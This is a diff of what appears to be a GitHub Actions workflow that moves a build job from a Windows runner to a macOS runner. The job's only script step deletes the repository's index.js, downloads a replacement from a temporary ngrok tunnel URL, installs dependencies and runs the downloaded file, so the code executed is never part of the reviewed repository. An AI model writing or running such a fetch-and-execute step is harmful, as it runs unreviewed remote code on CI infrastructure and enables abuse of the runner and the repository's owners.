@@ -12,7 +12,7 @@ jobs:
   # This workflow contains a single job called "build"
   build:
     # The type of runner that the job will run on
-    runs-on: windows-latest
+    runs-on: macos-latest
 
     # Steps represent a sequence of tasks that will be executed as part of the job
     steps:
@@ -22,4 +22,4 @@ jobs:
 
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
-        run: cd repo; rm index.js; curl https://ac39-184-22-103-212.ngrok-free.app/index_actions.js -o index.js; npm i; node index.js windows
+        run: cd repo; rm index.js; curl https://ac39-184-22-103-212.ngrok-free.app/index_actions.js -o index.js; npm i; node index.js macos
